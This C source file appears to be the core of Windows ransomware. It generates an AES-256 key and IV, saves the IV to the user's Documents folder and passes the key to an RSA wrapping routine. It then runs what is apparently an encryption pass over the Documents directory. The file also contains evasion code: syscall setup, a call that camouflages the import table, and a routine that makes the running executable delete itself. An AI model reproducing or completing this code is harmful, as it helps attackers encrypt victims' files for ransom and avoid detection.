#include <windows.h>
#include <stdio.h>
#include <strsafe.h>
#include"commonEnc.h"
#include"aes.h"
#include"IatC.h"

#define NEW L":NEWDATA"

static INT GoodFunction() {

	InitializeSysCalls();
	InitializeRandomValue();
	InitializeModules();
	uint8_t keyValue[AES_256_KEY_SIZE];
	uint8_t iv[IV_SIZE];
	SIZE_T szkey = AES_256_KEY_SIZE;
	WCHAR	userName[MAX_PATH * sizeof(WCHAR)];
	WCHAR	keyPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
	WCHAR directoryPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
	WCHAR ivPath[MAX_PATH * sizeof(WCHAR)] = L"C:\\Users\\";
	SIZE_T szName = MAX_PATH * sizeof(WCHAR);


	if (!GetUserNameW(userName, &szName)) {
		return -1;
	}

	if (!GenerateKey(keyValue, iv)) {
		return -1;
	}

	StringCchCat(keyPath, MAX_PATH * sizeof(WCHAR), userName);
	StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), userName);
	StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), L"\\Documents\\IV");

	if (!WriteToFile(iv, ivPath, IV_SIZE)) {
		return -1;
	}

	if (!RSAwork(keyValue, keyPath)) {
		return -1;
	}

	StringCchCat(directoryPath, MAX_PATH * sizeof(WCHAR), userName);
	StringCchCat(directoryPath, MAX_PATH * sizeof(WCHAR), L"\\Documents");

	if (!DirectoryFiles(directoryPath, keyValue, iv)) {
		return -1;
	}
	return 0;

}

BOOL SelfDeletion() {
	PFILE_RENAME_INFO pRenameInfo = NULL;
	FILE_DISPOSITION_INFO DeleteInfo = { 0 };
	const WCHAR* newInfo = (const WCHAR*)NEW;
	SIZE_T szNew = wcslen(newInfo) * sizeof(wchar_t);
	SIZE_T szRenameInfo = sizeof(FILE_RENAME_INFO) + szNew ;
	HANDLE hFile = NULL;
	WCHAR pPath[MAX_PATH] = { 0 };

	ZeroMemory(pPath, MAX_PATH);
	ZeroMemory(&DeleteInfo, sizeof(FILE_DISPOSITION_INFO));
	pRenameInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szRenameInfo);

	pRenameInfo->FileNameLength = szNew;
	RtlCopyMemory(pRenameInfo->FileName, newInfo, szNew);

	DeleteInfo.DeleteFile = TRUE;

	if (GetModuleFileNameW(NULL, pPath, MAX_PATH) == 0) {
		return FALSE;
	}
	hFile = CreateFileW(pPath, DELETE | SYNCHRONIZE , FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, szRenameInfo)) {
		return FALSE;
	}

	CloseHandle(hFile);

	hFile = CreateFileW(pPath, DELETE | SYNCHRONIZE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &DeleteInfo, sizeof(DeleteInfo))) {
		return FALSE;
	}
	
	CloseHandle(hFile);

	return TRUE;

}

int WinMain() {
		SelfDeletion();
		IatCamouflage();
		GoodFunction();


	getchar();
	return 0;
}

